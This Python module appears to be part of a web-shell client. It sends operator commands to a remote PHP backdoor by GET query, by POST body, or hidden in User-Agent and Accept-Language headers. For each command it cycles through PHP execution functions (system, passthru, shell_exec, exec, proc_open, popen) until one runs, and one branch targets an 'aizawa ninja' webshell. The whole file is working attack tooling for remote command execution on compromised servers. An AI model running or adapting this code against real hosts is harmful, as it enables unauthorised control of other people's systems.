import sys
import httpx
from modules.utils.colors import *
from modules.utils.headers import create_headers
from modules.http_requests.http_request import http_request
from modules.http_requests.http_aizawa_ninja import http_aizawa_ninja
from .execute_http_request_get import execute_http_request_get
from .execute_http_request_post import execute_http_request_post
from modules.http_requests.http_user_agent_get import http_user_agent_get
from modules.http_requests.http_user_agent_post import http_user_agent_post
from modules.http_requests.http_accept_language_get import http_accept_language_get
from modules.http_requests.http_accept_language_post import http_accept_language_post

async def execute(client, url, cmd, type):
    if type == "ping":
        try:
            headers = create_headers()
            r = await client.get(url, headers=headers, follow_redirects=True)
            if r.status_code != 200:
                sys.exit(
                print(
                    BOLD
                    + YELLOW
                    + "WARNING!"
                    + CLEAR
                    + "\n"
                    + RED
                    + "ERROR"
                    + CLEAR
                    + ": Invalid HTTP response code\n"
                    + "Please check the URL and try again\n"
                ))
        except httpx.RequestError as e:
            sys.exit(
            print(
                BOLD
                + YELLOW
                + "WARNING!"
                + CLEAR
                + "\n"
                + RED
                + "ERROR"
                + CLEAR
                + ": URL is not reachable\n"
                + "Please check the URL and try again\n"
            ))

    if type in ["get", "post"]:
        headers = create_headers()
        if type == "get":
            r = await http_request(client, "get", url + cmd, headers)
            if r:
                return r
            return RED + "ERROR" + CLEAR
        elif type == "post":
            r = await client.post(url, headers=headers, data=cmd)
            if r.text:
                return r.text
            return RED + "ERROR" + CLEAR

    if type in [
        "http_aizawa_ninja_eval",
        "http_aizawa_ninja_concat",
        "http_aizawa_ninja_debug",
        "http_aizawa_ninja_gc",
        "http_aizawa_ninja_json",
        "http_aizawa_ninja_filter",
    ]:
        methods = ["system~", "passthru~", "shell_exec~", "exec~"]
        if type == "http_aizawa_ninja_eval":
            for method in methods:
                result = await http_aizawa_ninja(client, url, method + cmd)
                if result:
                    return result
            return RED + "ERROR" + CLEAR
        else:
            result = await http_aizawa_ninja(client, url, cmd)
            if result:
                return result
            return RED + "ERROR" + CLEAR

    if type in ["http_accept_language_get", "http_user_agent_get"]:
        methods = [
            "?cmd=system",
            "?cmd=proc_open",
            "?cmd=popen",
            "?cmd=passthru",
            "?cmd=shell_exec",
            "?cmd=exec",
        ]
        request_func = (
            http_accept_language_get
            if type == "http_accept_language_get"
            else http_user_agent_get
        )
        for method in methods:
            result = await execute_http_request_get(
                client, url, cmd, method, request_func
            )
            if result:
                return result
        return RED + "ERROR" + CLEAR

    if type in ["http_accept_language_post", "http_user_agent_post"]:
        methods = ["system", "proc_open", "popen", "passthru", "shell_exec", "exec"]
        request_func = (
            http_accept_language_post
            if type == "http_accept_language_post"
            else http_user_agent_post
        )
        for method in methods:
            result = await execute_http_request_post(
                client, url, cmd, method, request_func
            )
            if result:
                return result
        return RED + "ERROR" + CLEAR